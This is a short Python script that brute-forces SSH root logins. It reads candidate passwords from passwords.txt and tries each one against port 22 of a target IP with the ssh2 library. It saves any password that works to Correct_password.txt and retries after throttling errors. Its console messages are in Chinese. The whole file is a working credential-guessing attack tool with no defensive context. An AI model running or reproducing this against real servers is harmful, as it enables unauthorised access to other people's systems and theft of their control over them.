import ssh2.session
import socket
import time
import threading
pass1 = False
def connectssh(ip,password12):
    global pass1
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 22))
    s.settimeout(1)
    session = ssh2.session.Session()
    session.handshake(s)
    try:
        session.userauth_password(username='root', password=str(password12))
        print(f'[+]ip -->'+ip+" ssh服务密码"+str(password12)+"正确")
        with open('Correct_password.txt','wb') as f:
            f.write(ip.encode('utf-8')+str(password12).encode('utf-8'))
        pass1 = True
        session.disconnect()
        s.close()
        exit()
    except ssh2.exceptions.AuthenticationError:
        print("[-]ip -->"+ip+" ssh服务密码:"+str(password12)+"错误")
        session.disconnect()
        s.close()
def start(ip):
    with open('passwords.txt', 'r') as f:
        fileattack_password = f.read().split('\n')
        for password in fileattack_password:
            try:
                #print (password)
                connectssh(ip,password)
            except ssh2.exceptions.KeyExchangeError:
                time.sleep(20)
                continue
            except ssh2.exceptions.SocketRecvError:
                 print("[-]数据接收错误,正在清理冗余连接,10秒钟后重试!")
                 time.sleep(20)
                 continue
            except ConnectionRefusedError:
                 print ("[-]未开启22号端口!")
                 break
            except TimeoutError:
                print ("[-]连接超时,已跳过....")
                break
                ##t = threading.Thread(target=connectssh,args=[ip,password])
                ##t.start()
